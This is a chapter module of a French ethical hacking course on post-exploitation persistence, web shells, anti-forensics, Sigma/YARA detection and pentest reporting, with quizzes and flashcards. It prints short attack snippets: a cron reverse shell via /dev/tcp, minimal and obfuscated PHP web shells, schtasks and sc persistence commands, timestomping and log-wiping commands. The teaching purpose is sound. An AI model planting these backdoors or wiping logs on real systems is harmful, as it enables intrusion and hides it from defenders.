/**
 * Chapitre 6 du cours « Hacking Éthique & Pentest B3 ».
 */
'use strict';

module.exports = {
  "n": 6,
  "title": "Maintien de l'Accès, Post-Exploitation, Anti-Forensics & Rapport de Pentest",
  "short": "Persistance, Anti-Forensics &amp; Reporting",
  "toc": "Mécanismes de persistance et maintien de l'accès (web shells obfusqués, tâches cron, services d'arrière-plan, clés SSH autorisées, clés de registre Run/RunOnce sous Windows), techniques de dissimulation et d'anti-forensics (timestomping, altération de journaux d'événements syslog et wevtutil), compréhension des contre-mesures défensives (SIEM, EDR, règles Sigma et signatures YARA), méthodologie de rédaction du rapport de test d'intrusion professionnel, synthèse managériale (Executive Summary) et plan de remédiation priorisé.",
  "time": "≈ 2 h 45 de travail",
  "free": false,
  "situation": "Un test d'intrusion ne s'achève pas lorsqu'un accès root est obtenu : sa valeur ajoutée réside intégralement dans la qualité du rapport délivré au client et dans l'évaluation de la capacité défensive de l'organisation. Un rapport incompréhensible pour la direction ou un nettoyage négligé laissant des backdoors actives sur les serveurs de production ruine la crédibilité de l'auditeur. En tant qu'expert en cybersécurité B3, vous devez maîtriser les techniques de persistance et de post-exploitation pour évaluer la réactivité du SOC, nettoyer scrupuleusement vos implants, et rédiger un rapport d'audit d'excellence articulant synthèse managériale percutante et fiches de remédiation technique actionnables.",
  "objectives": [
    "analyser les mécanismes de persistance sous Linux (cron, systemd, authorized_keys) et Windows (Run keys, services) ;",
    "détecter et désobfusquer les web shells PHP/JSP exploitant des fonctions d'évaluation dynamique ;",
    "comprendre les techniques d'anti-forensics (timestomping, effacement de logs) et leur détection par la Blue Team ;",
    "analyser les règles de détection comportementale modernes : règles Sigma pour SIEM et règles YARA pour fichiers ;",
    "structurer un rapport de test d'intrusion complet conforme aux standards de l'industrie (PTES) ;",
    "rédiger un Executive Summary managérial et un plan de remédiation priorisé (immédiat, court terme, moyen terme)."
  ],
  "sections": [
    {
      "title": "Persistance &amp; Maintien de l'Accès (Linux &amp; Windows)",
      "html": "<p>La persistance garantit qu'un redémarrage de la machine ou une coupure de session n'interrompt pas l'accès obtenu par l'auditeur ou l'attaquant :</p>\n<div class=\"grid grid-2\">\n  <div class=\"card\">\n    <h4>Mécanismes de Persistance Linux</h4>\n    <ul>\n      <li><strong>Clés SSH autorisées :</strong> injection de la clé publique de l'auditeur dans <code>~/.ssh/authorized_keys</code> ou <code>/root/.ssh/authorized_keys</code> pour des reconnexions directes.</li>\n      <li><strong>Tâches Crontab :</strong> création d'une entrée planifiée dans <code>/etc/cron.d/</code> exécutant périodiquement un reverse shell (ex: <code>* * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>).</li>\n      <li><strong>Unités Systemd :</strong> création d'un service persistant avec redémarrage automatique (<code>Restart=always</code>) dans <code>/etc/systemd/system/</code>.</li>\n      <li><strong>Fichiers de profil shell :</strong> ajout de commandes masquées à la fin de <code>/etc/profile</code> ou <code>~/.bashrc</code> exécutées à chaque connexion d'un administrateur.</li>\n    </ul>\n  </div>\n  <div class=\"card\">\n    <h4>Mécanismes de Persistance Windows</h4>\n    <ul>\n      <li><strong>Clés de Registre Run / RunOnce :</strong> <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> (exécuté à l'ouverture de session de l'utilisateur).</li>\n      <li><strong>Tâches Planifiées (Task Scheduler) :</strong> création d'une tâche via la commande <code>schtasks /create /sc onlogon /tn \"Update\" /tr \"payload.exe\"</code>.</li>\n      <li><strong>Services Windows persistants :</strong> création d'un service système avec démarrage automatique via <code>sc create PersistentSvc binpath= \"C:\\implant.exe\" start= auto</code>.</li>\n      <li><strong>Dossier de Démarrage (Startup) :</strong> dépôt d'un binaire ou raccourci dans <code>shell:startup</code>.</li>\n    </ul>\n  </div>\n</div>"
    },
    {
      "title": "Web Shells &amp; Détection de l'Obfuscation",
      "html": "<p>Sur les serveurs web, le dépôt d'un web shell constitue la porte dérobée applicative la plus fréquente :</p>\n<div class=\"grid grid-2\">\n  <div class=\"card\">\n    <h4>Anatomie d'un Web Shell PHP</h4>\n    <p>Forme minimale non obfusquée :</p>\n    <pre><code>&lt;?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?&gt;</code></pre>\n    <p>Fonctions d'exécution système surveillées : <code>system()</code>, <code>passthru()</code>, <code>shell_exec()</code>, <code>exec()</code>, <code>popen()</code>, <code>proc_open()</code>.</p>\n  </div>\n  <div class=\"card\">\n    <h4>Techniques d'Obfuscation</h4>\n    <p>Pour contourner les antivirus et scanners de fichiers (WAF/EDR) :</p>\n    <ul>\n      <li>Encodage Base64 et compression : <code>eval(gzinflate(base64_decode($payload)));</code></li>\n      <li>Concaténation dynamique de chaînes : <code>$a = \"sys\".\"tem\"; $a($_GET[\"x\"]);</code></li>\n      <li>Variables variables et fonctions anonymes : <code>$_=\"assert\"; $_($_POST[\"c\"]);</code></li>\n    </ul>\n  </div>\n</div>"
    },
    {
      "title": "Dissimulation, Anti-Forensics &amp; Nettoyage d'Implants",
      "html": "<p>L'étape 5 du hacking éthique évalue les traces laissées et procède au nettoyage scrupuleux de l'environnement :</p>\n<div class=\"grid grid-3\">\n  <div class=\"card\">\n    <h4>Timestomping (Horodatage)</h4>\n    <p>Modification délibérée des horodatages MACB (Modification, Access, Creation, Birth) d'un fichier malveillant pour les aligner sur des binaires système légitimes (ex: <code>touch -r /bin/ls /tmp/implant</code>).</p>\n    <p>Complique la chronologie des analystes forensiques (DFIR).</p>\n  </div>\n  <div class=\"card\">\n    <h4>Gestion des Journaux d'Événements</h4>\n    <p>Les attaquants tentent d'effacer leurs traces dans l'historique shell (<code>history -c</code>, <code>unset HISTFILE</code>) ou dans les journaux Windows (<code>wevtutil cl Security</code>).</p>\n    <p>La Blue Team détecte cet effacement brutal comme une alerte critique majeure.</p>\n  </div>\n  <div class=\"card\">\n    <h4>Protocole de Nettoyage (Cleanup)</h4>\n    <p>Règle d'or du pentest : <strong>tous les artefacts déposés doivent être supprimés</strong> à la fin de la mission.</p>\n    <p>Suppression des comptes de test créés, des clés SSH ajoutées, des scripts web shells et des tâches planifiées.</p>\n  </div>\n</div>"
    },
    {
      "title": "Détection Moderne de la Blue Team : SIEM, EDR, Sigma &amp; YARA",
      "html": "<p>L'équipe défensive déploie des outils de surveillance pour intercepter les tactiques offensives :</p>\n<div class=\"grid grid-2\">\n  <div class=\"card\">\n    <h4>Règles Sigma (Détection de Logs SIEM)</h4>\n    <p>Format standardisé et agnostique pour décrire des comportements d'attaque dans les journaux système :</p>\n    <pre><code>title: Détection d'accès au fichier shadow via commande anormale\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        CommandLine|contains: '/etc/shadow'\n    condition: selection\nlevel: critical</code></pre>\n  </div>\n  <div class=\"card\">\n    <h4>Règles YARA (Détection de Fichiers &amp; Binaires)</h4>\n    <p>Outil d'identification et de classification de malwares basé sur des signatures textuelles ou binaires :</p>\n    <pre><code>rule Webshell_PHP_Eval_Base64 {\n    strings:\n        $eval = \"eval(\" ascii\n        $b64 = \"base64_decode\" ascii\n        $req = \"$_POST\" ascii\n    condition:\n        all of them\n}</code></pre>\n  </div>\n</div>"
    },
    {
      "title": "Structure Normalisée du Rapport de Test d'Intrusion Professionnel",
      "html": "<p>Le rapport d'intrusion est l'unique livrable tangible de la mission. Il doit s'adresser simultanément aux décideurs et aux équipes techniques :</p>\n<table class=\"table\">\n  <thead><tr><th>Partie du Rapport</th><th>Public Visé</th><th>Contenu Clé &amp; Exigences</th></tr></thead>\n  <tbody>\n    <tr><td><strong>Synthèse Managériale (Executive Summary)</strong></td><td>Direction Générale, DSI, RSSI</td><td>Résumé non-technique (1 à 2 pages), niveau de risque global qualifié, cartographie des impacts métier, principaux constats et feuille de route budgétaire.</td></tr>\n    <tr><td><strong>Périmètre &amp; Méthodologie</strong></td><td>Responsables Sécurité, Auditeurs</td><td>Rappel des règles d'engagement (RoE), adresses IP/URLs cibles, dates et heures des tests, limitations rencontrées.</td></tr>\n    <tr><td><strong>Fiches Techniques de Vulnérabilités</strong></td><td>Administrateurs, Développeurs</td><td>Pour chaque faille : Titre, Score CVSS v3.1, description technique détaillée, preuve de concept (PoC éthique), captures d'écran et recommandation précise.</td></tr>\n    <tr><td><strong>Plan de Remédiation Priorisé</strong></td><td>Chefs de projets, Équipes Opérationnelles</td><td>Matrice de priorisation classée par horizon : <em>Immédiat / Quick wins</em> (&lt; 48 h), <em>Court terme</em> (&lt; 30 j) et <em>Moyen/Long terme</em> (&lt; 90 j).</td></tr>\n  </tbody>\n</table>"
    }
  ],
  "method": [
    "Évaluer la résilience défensive en testant des mécanismes discrets de persistance (cron, authorized_keys).",
    "Analyser les traces résiduelles dans les journaux d'événements pour mesurer la visibilité du SOC.",
    "Procéder au nettoyage intégral et documenté de tous les artefacts déposés sur l'infrastructure client.",
    "Agréger et pondérer l'ensemble des vulnérabilités découvertes pour calculer la posture de risque global.",
    "Rédiger le rapport de pentest complet avec synthèse managériale, preuves de concept et feuille de route."
  ],
  "summary": [
    "Le maintien de l'accès exploite des mécanismes de démarrage légitimes (cron, systemd, authorized_keys, clés Run du Registre).",
    "Les web shells dissimulent leur code via des encodages Base64 et des fonctions d'exécution dynamique (eval, assert).",
    "Les techniques d'anti-forensics comme le timestomping cherchent à tromper l'investigation numérique des analystes DFIR.",
    "La Blue Team surveille les activités suspectes grâce aux SIEM/EDR alimentés par des règles Sigma et YARA.",
    "Le rapport d'intrusion est le livrable fondamental du pentesteur : il articule Executive Summary et fiches techniques détaillées."
  ],
  "checklist": [
    "Je sais auditer et détecter les mécanismes de persistance et les web shells obfusqués.",
    "Je comprends les principes des règles de détection comportementale Sigma et YARA.",
    "Je maîtrise la structure normalisée d'un rapport de test d'intrusion professionnel (PTES).",
    "Je sais rédiger une synthèse managériale impactante et structurer un plan de remédiation par horizon."
  ],
  "notions": [
    {
      "term": "Persistance",
      "def": "Mécanisme garantissant la survie d'un accès après le redémarrage d'un serveur ou la déconnexion de l'utilisateur."
    },
    {
      "term": "Web Shell",
      "def": "Script backdoor déposé sur un serveur web permettant l'exécution distante de commandes système via HTTP."
    },
    {
      "term": "Timestomping",
      "def": "Technique d'anti-forensics modifiant les horodatages MACB d'un fichier pour le dissimuler parmi les binaires système."
    },
    {
      "term": "Règles Sigma",
      "def": "Format ouvert et générique de détection de comportements suspects dans les journaux d'événements SIEM."
    },
    {
      "term": "Executive Summary",
      "def": "Synthèse managériale non-technique d'un rapport d'intrusion exposant le risque global et les impacts métier."
    }
  ],
  "pitfalls": [
    "Oublier de nettoyer tous les implants, web shells et comptes de test à l'issue de la mission de pentest.",
    "Rédiger un rapport d'intrusion exclusivement technique sans synthèse managériale adaptée aux décideurs.",
    "Proposer des recommandations vagues (\"Mettre à jour les systèmes\") plutôt qu'un plan d'action priorisé par horizon.",
    "Tenter un effacement brutal des journaux Windows (wevtutil) déclenchant immédiatement l'événement d'alerte 1102."
  ],
  "questions": [
    {
      "stem": "Quel est l'objectif premier de la Synthèse Managériale (Executive Summary) dans un rapport de test d'intrusion ?",
      "opts": [
        "Vulgariser les résultats de l'audit et l'impact métier pour les décideurs et la direction sans jargon technique excessif",
        "Copier-coller l'intégralité des sorties brutes des scans Nmap pour prouver le travail accompli",
        "Fournir des exploits prêts à l'emploi pour attaquer les concurrents",
        "Remplacer le contrat de mandat en cas de litige judiciaire"
      ],
      "correct": 0,
      "exp": "L'Executive Summary s'adresse aux décideurs (membres du comité de direction, DSI, RSSI) : il synthétise le niveau de risque global, les conséquences métier et les investissements de remédiation requis."
    },
    {
      "stem": "Quel mécanisme sous Linux permet à un attaquant de maintenir un accès persistant en s'authentifiant par clé publique sans mot de passe ?",
      "opts": [
        "L'ajout de sa clé publique dans le fichier ~/.ssh/authorized_keys",
        "La modification du fichier /etc/resolv.conf",
        "L'effacement du binaire /bin/bash",
        "L'activation du protocole Telnet sur le port 23"
      ],
      "correct": 0,
      "exp": "Le fichier authorized_keys répertorie les clés publiques autorisées à ouvrir une session SSH : y déposer sa clé garantit un accès persistant immédiat sans nécessiter le mot de passe du compte."
    },
    {
      "stem": "Quelle clé de registre Windows est couramment exploitée par les malwares pour persister et s'exécuter automatiquement à l'ouverture de session utilisateur ?",
      "opts": [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip",
        "HKCR\\.txt",
        "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall"
      ],
      "correct": 0,
      "exp": "Les clés de registre Run et RunOnce exécutent les programmes qui y sont référencés à chaque ouverture de session de l'utilisateur, constituant le vecteur de persistance le plus classique sous Windows."
    },
    {
      "stem": "Qu'est-ce que la technique d'anti-forensics appelée \"Timestomping\" ?",
      "opts": [
        "La modification volontaire des dates et heures de création/modification d'un fichier malveillant pour le fondre parmi les fichiers système légitimes",
        "L'accélération de l'horloge matérielle du processeur pour dépasser les quotas réseau",
        "L'effacement physique des disques durs à l'aide d'un aimant",
        "Le blocage des requêtes NTP sur le réseau local"
      ],
      "correct": 0,
      "exp": "Le timestomping altère les attributs d'horodatage (MACB) d'un implant pour lui donner la même date qu'un fichier système voisin (ex: 2018), trompant les recherches par date des analystes de réponse à incident."
    },
    {
      "stem": "Quel est le rôle d'une règle YARA en cybersécurité défensive ?",
      "opts": [
        "Identifier et classifier des fichiers malveillants ou web shells en analysant la présence de chaînes textuelles ou motifs binaires spécifiques",
        "Chiffrer les disques durs des serveurs de production",
        "Créer des tunnels VPN entre deux datacenters distants",
        "Générer des clés d'activation logicielles"
      ],
      "correct": 0,
      "exp": "YARA est l'outil de référence pour la détection de malwares : il permet aux analystes de concevoir des signatures identifiant des familles d'implants sur la base de chaînes de caractères et de motifs hexadécimaux."
    },
    {
      "stem": "Pourquoi l'effacement brutal de l'intégralité des journaux de sécurité Windows (wevtutil cl Security) est-il paradoxalement très risqué pour un attaquant furtif ?",
      "opts": [
        "Parce que le vidage d'un journal génère obligatoirement l'événement critique 1102 (\"The audit log was cleared\") qui alerte immédiatement le SIEM/SOC",
        "Parce que cette commande réinitialise immédiatement le mot de passe du domaine",
        "Parce que Windows refuse d'exécuter cette commande même avec des privilèges SYSTEM",
        "Parce que cela supprime les fichiers système Windows et fait crasher l'ordinateur"
      ],
      "correct": 0,
      "exp": "Le vidage du journal d'audit de sécurité génère un événement spécifique (Event ID 1102) que tout SOC surveille avec la plus haute priorité : c'est un indicateur de compromission (IoC) flagrant."
    },
    {
      "stem": "À quel horizon de temps les recommandations qualifiées de \"Quick Wins\" dans un plan de remédiation doivent-elles être appliquées ?",
      "opts": [
        "Immédiat (moins de 24 à 48 heures) car elles sont simples à déployer et neutralisent les risques critiques majeurs",
        "Dans 3 à 5 ans après renouvellement complet du parc informatique",
        "Uniquement si le budget annuel de sécurité est excédentaire",
        "Après avoir réécrit entièrement l'application en langage assembleur"
      ],
      "correct": 0,
      "exp": "Les Quick Wins représentent des actions correctives à très fort impact et faible complexité (ex: révoquer un binaire SUID inutile, corriger un enregistrement SPF) à déployer sous 24 à 48 heures."
    },
    {
      "stem": "Pourquoi la phase de nettoyage (Cleanup) des artefacts est-elle une exigence éthique et contractuelle absolue pour l'auditeur de sécurité ?",
      "opts": [
        "Pour ne laisser aucune porte dérobée, compte de test ou binaire malveillant susceptible d'être réexploité ultérieurement par un véritable cybercriminel",
        "Pour que le client ne puisse pas reproduire les tests effectués",
        "Pour économiser de l'espace disque sur le serveur du client",
        "Pour éviter de devoir rédiger les fiches techniques du rapport"
      ],
      "correct": 0,
      "exp": "Tout implant, compte ou web shell oublié par l'auditeur devient une vulnérabilité supplémentaire sur le système client qui pourrait être découverte et exploitée par un acteur malveillant."
    }
  ],
  "mastery": [
    {
      "cls": "low",
      "text": "&lt; 50 % — Reprends les sections théoriques et revois les définitions clés."
    },
    {
      "cls": "mid",
      "text": "50–69 % — Pratique les exercices N1 de l'atelier avant de retenter le test."
    },
    {
      "cls": "good",
      "text": "70–89 % — Bon niveau opérationnel : affine les cas limites et les options d'outils."
    },
    {
      "cls": "top",
      "text": "≥ 95 % — Maîtrise d'ingénierie validée : passe au module suivant."
    }
  ],
  "flashcards": [
    {
      "q": "Qu'est-ce qu'un web shell et comment fonctionne-t-il ?",
      "a": "Un script déposé sur un serveur web permettant à l'attaquant d'exécuter des commandes système à distance via des requêtes HTTP (ex: system($_GET[\"cmd\"]))."
    },
    {
      "q": "Comment un attaquant crée-t-il une persistance par tâche planifiée sous Linux ?",
      "a": "En ajoutant une ligne dans crontab ou /etc/cron.d/ exécutant un reverse shell périodiquement vers son serveur de contrôle (C2)."
    },
    {
      "q": "Qu'est-ce que la technique de Timestomping en anti-forensics ?",
      "a": "La falsification des dates de modification et création d'un implant pour l'aligner sur des fichiers système légitimes et tromper la chronologie des analystes DFIR."
    },
    {
      "q": "Quel événement de sécurité Windows (Event ID) est généré lors de l'effacement du journal de sécurité ?",
      "a": "L'Event ID 1102 (\"The audit log was cleared\"), qui constitue une alerte critique immédiate pour les équipes de surveillance du SOC."
    },
    {
      "q": "Qu'est-ce que le standard Sigma dans l'écosystème SIEM ?",
      "a": "Un format générique de règles de détection comportementale indépendant des technologies, traduisible pour Splunk, Elastic, QRadar, etc."
    },
    {
      "q": "Quelles sont les 3 catégories de remédiation d'un plan d'action de pentest ?",
      "a": "1. Immédiat / Quick wins (< 48 h) | 2. Court terme (< 30 jours) | 3. Moyen et long terme structurel (< 90 jours)."
    }
  ]
};
